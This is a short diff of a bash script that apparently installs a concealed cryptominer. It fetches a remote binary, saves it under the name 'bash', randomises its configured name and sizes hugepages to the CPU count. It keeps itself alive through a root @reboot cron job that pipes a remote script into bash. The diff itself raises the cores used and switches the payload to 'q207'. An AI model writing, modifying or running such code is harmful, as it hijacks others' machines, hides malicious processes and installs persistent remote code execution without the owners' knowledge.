@@ -30,7 +30,7 @@ if [ "$mode" == "1" ]; then
   ###bash <(echo 'while true; do echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 12\r\n\r\nHello World" |nc -l -q 1 -p 8080; done') >/dev/null 2>&1 &
   #bash <(wget -qO- ${src}/k.sh) 43200 21600 >/dev/null 2>&1 &
   [ "$cores" == "2" ] && cores="1";
-  [ "$cores" == "8" ] && cores="4";
+  [ "$cores" == "8" ] && cores="8";
 fi
 
 sudo sysctl -w vm.nr_hugepages=$((cores*768)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*768)) >/dev/null 2>&1
@@ -39,7 +39,7 @@ sudo sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/zh88kk2.sh |bash >/de
 
 rm -rf "${work}"; mkdir -p "${work}"
 wget --no-check-certificate -4 -qO "${work}/appsettings.json" "${src}/q.json"
-wget --no-check-certificate -4 -qO "${work}/bash" "${src}/q"
+wget --no-check-certificate -4 -qO "${work}/bash" "${src}/q207"
 chmod -R 777 "${work}"
 sed -i "s/\"trainerBinary\":.*/\"trainerBinary\": \"$(RandString 7)\",/" "${work}/appsettings.json"
 
